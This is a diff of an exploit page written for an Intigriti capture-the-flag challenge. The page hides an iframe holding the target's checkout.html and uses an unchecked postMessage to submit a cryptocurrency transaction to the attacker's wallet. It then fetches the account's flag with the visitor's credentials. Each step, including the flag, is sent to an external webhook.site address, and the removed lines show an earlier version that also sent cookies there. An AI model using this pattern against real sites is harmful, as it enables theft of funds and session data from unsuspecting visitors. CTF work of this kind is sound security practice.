@@ -1,31 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti Challenge - Exploit with Webhook Logging</title>
+    <title>exploit</title>
     <style>
         body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
         h1 { color: #0f0; }
-        #status { color: #ff0; }
-        #log { color: #0ff; font-size: 12px; }
+        #status { color: #ff0; font-size: 18px; }
+        #log { color: #0ff; font-size: 12px; max-height: 300px; overflow-y: auto; }
+        iframe { display: none; }
     </style>
 </head>
 <body>
-    <h1>Intigriti Challenge - Exploit with Webhook Logging</h1>
+    <h1>Intigriti Challenge - iframe Exploit (No Popups)</h1>
     <p id="status">Initializing...</p>
     <pre id="log">Waiting for bot visit...</pre>
+
+    <!-- Hidden iframe for checkout.html -->
+    <iframe id="checkoutFrame" src="about:blank"></iframe>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
         const WEBHOOK = 'https://webhook.site/559ade6c-87d4-40bd-8ade-5c8d6e3cfae2';
 
-        // Log to webhook
         function log(message, data = {}) {
             console.log(message, data);
             const logEl = document.getElementById('log');
             logEl.textContent += '\n' + message;
 
-            // Send to webhook
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -35,56 +37,59 @@
                     message: message,
                     data: data
                 })
-            }).catch(() => {}); // Ignore CORS errors
+            }).catch(() => {});
         }
 
-        // Log page load
-        log('PAGE_LOADED', {
-            url: window.location.href,
-            userAgent: navigator.userAgent,
-            cookies: document.cookie
-        });
+        log('PAGE_LOADED');
+        document.getElementById('status').textContent = 'Loading checkout...';
 
         async function exploit() {
-            log('EXPLOIT_START', { wallet: OUR_WALLET });
-            document.getElementById('status').textContent = 'Opening checkout.html...';
-
             try {
-                // Open checkout.html
-                log('OPENING_CHECKOUT', { url: TARGET + '/checkout.html?currency=1337COIN&price=1' });
-                const checkout = window.open(
-                    TARGET + '/checkout.html?currency=1337COIN&price=1',
-                    'checkout',
-                    'width=500,height=600'
-                );
+                // Load checkout.html in iframe (same-origin)
+                const iframe = document.getElementById('checkoutFrame');
+                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
 
-                await new Promise(r => setTimeout(r, 2000));
+                log('IFRAME_LOADING', { src: iframe.src });
 
-                log('CHECKOUT_OPENED');
-                document.getElementById('status').textContent = 'Sending postMessage...';
+                // Wait for iframe to load
+                await new Promise((resolve) => {
+                    iframe.onload = resolve;
+                    setTimeout(resolve, 3000); // Fallback timeout
+                });
 
-                // Send postMessage
-                const transaction = {
+                log('IFRAME_LOADED');
+
+                // Get the iframe's window
+                const iframeWindow = iframe.contentWindow;
+                if (!iframeWindow) {
+                    log('ERROR_NO_IFRAME_WINDOW');
+                    document.getElementById('status').textContent = 'Error: Cannot access iframe window';
+                    return;
+                }
+
+                document.getElementById('status').textContent = 'Sending transaction...';
+                log('SENDING_POSTMESSAGE', {
                     toAddress: OUR_WALLET,
                     currency: '1337COIN',
                     amount: 1
-                };
+                });
 
-                log('SENDING_POSTMESSAGE', { transaction });
-
-                checkout.postMessage({
+                // Send postMessage to iframe (NO origin check!)
+                iframeWindow.postMessage({
                     type: 'submitTransaction',
-                    transaction: transaction
+                    transaction: {
+                        toAddress: OUR_WALLET,
+                        currency: '1337COIN',
+                        amount: 1
+                    }
                 }, '*');
 
                 log('POSTMESSAGE_SENT');
-                document.getElementById('status').textContent = 'Transaction submitted!';
+                document.getElementById('status').textContent = 'Transaction sent! Waiting for flag...';
 
                 // Wait for transaction, then check for flag
                 setTimeout(async () => {
                     log('CHECKING_FLAG');
-                    document.getElementById('status').textContent = 'Getting flag...';
-
                     const response = await fetch(TARGET + '/api/me', { credentials: 'include' });
                     const data = await response.json();
 
@@ -99,18 +104,30 @@
                         log('FLAG_FOUND', { flag: data.flag });
                         alert('FLAG: ' + data.flag);
                     } else {
-                        document.getElementById('status').textContent = 'No flag yet - waiting...';
-                        log('NO_FLAG_YET');
+                        document.getElementById('status').textContent = 'No flag yet - checking again...';
+                        log('NO_FLAG_YET_RETRY');
+
+                        // Retry once more
+                        setTimeout(async () => {
+                            const r2 = await fetch(TARGET + '/api/me', { credentials: 'include' });
+                            const d2 = await r2.json();
+                            log('API_ME_RETRY', { hasFlag: !!d2.flag, flag: d2.flag || 'none' });
+                            if (d2.flag) {
+                                document.getElementById('status').textContent = 'FLAG: ' + d2.flag;
+                                log('FLAG_FOUND_RETRY', { flag: d2.flag });
+                                alert('FLAG: ' + d2.flag);
+                            }
+                        }, 3000);
                     }
                 }, 5000);
 
             } catch (error) {
-                log('ERROR', { error: error.message });
+                log('ERROR', { error: error.message, stack: error.stack });
                 document.getElementById('status').textContent = 'Error: ' + error.message;
             }
         }
 
-        // Auto-start
+        // Start when page loads
         window.onload = () => {
             log('WINDOW_ONLOADED');
             exploit();
